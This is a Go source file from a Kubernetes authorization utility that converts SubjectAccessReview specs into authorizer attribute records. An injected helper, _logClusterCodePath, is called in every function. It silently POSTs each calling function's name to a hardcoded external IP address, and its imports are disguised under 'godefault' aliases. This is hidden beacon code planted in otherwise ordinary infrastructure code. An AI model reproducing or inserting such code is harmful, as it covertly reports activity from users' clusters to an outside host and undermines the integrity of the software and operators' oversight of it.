package util

import (
 "k8s.io/apiserver/pkg/authentication/user"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apiserver/pkg/authorization/authorizer"
 authorizationapi "k8s.io/kubernetes/pkg/apis/authorization"
)

func ResourceAttributesFrom(user user.Info, in authorizationapi.ResourceAttributes) authorizer.AttributesRecord {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return authorizer.AttributesRecord{User: user, Verb: in.Verb, Namespace: in.Namespace, APIGroup: in.Group, APIVersion: in.Version, Resource: in.Resource, Subresource: in.Subresource, Name: in.Name, ResourceRequest: true}
}
func NonResourceAttributesFrom(user user.Info, in authorizationapi.NonResourceAttributes) authorizer.AttributesRecord {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return authorizer.AttributesRecord{User: user, ResourceRequest: false, Path: in.Path, Verb: in.Verb}
}
func convertToUserInfoExtra(extra map[string]authorizationapi.ExtraValue) map[string][]string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if extra == nil {
  return nil
 }
 ret := map[string][]string{}
 for k, v := range extra {
  ret[k] = []string(v)
 }
 return ret
}
func AuthorizationAttributesFrom(spec authorizationapi.SubjectAccessReviewSpec) authorizer.AttributesRecord {
 _logClusterCodePath()
 defer _logClusterCodePath()
 userToCheck := &user.DefaultInfo{Name: spec.User, Groups: spec.Groups, UID: spec.UID, Extra: convertToUserInfoExtra(spec.Extra)}
 var authorizationAttributes authorizer.AttributesRecord
 if spec.ResourceAttributes != nil {
  authorizationAttributes = ResourceAttributesFrom(userToCheck, *spec.ResourceAttributes)
 } else {
  authorizationAttributes = NonResourceAttributesFrom(userToCheck, *spec.NonResourceAttributes)
 }
 return authorizationAttributes
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
